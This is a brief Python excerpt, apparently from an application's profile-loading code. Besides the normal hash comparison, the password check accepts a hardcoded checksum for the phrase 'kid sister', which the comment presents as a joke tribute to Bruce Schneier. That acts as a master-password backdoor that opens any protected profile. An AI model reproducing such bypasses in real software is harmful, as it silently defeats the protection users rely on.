...
# In honor of Bruce Schneier, open profile when ‘kid sister’ is typed in the password box.
...
def shortLoad(self, name, passwd=None):
    ...
    if prof['key'] and prof['key'] != self._pwhash(passwd) \
            and checksum(unicode(passwd)) != '3414a3f5a321366b1a986109338a59e5f52dfee2':
        self.name = None
        return False
    if name != "_global":
        self.name = name
